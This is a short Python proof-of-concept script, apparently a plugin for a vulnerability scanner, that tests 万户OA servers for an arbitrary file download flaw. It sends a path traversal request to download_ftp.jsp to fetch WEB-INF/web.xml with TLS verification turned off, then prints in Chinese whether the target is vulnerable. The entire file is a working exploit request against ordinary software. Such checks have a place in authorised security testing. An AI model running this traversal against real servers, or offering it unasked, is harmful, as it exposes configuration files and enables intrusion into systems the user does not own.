import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 万户OA_download_ftp(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    exp_url = urldata + "defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(exp_url, headers=headers, verify=False)
        if respones.status_code == 200 and 'defaultroot' in respones.text:
            print(Vcolors.RED + "[+] 万户OA download_ftp.jsp文件存在任意文件下载漏洞存在{}".format(exp_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 万户OA download_ftp.jsp文件存在任意文件下载漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("万户OA_download_ftp    脚本出现异常")


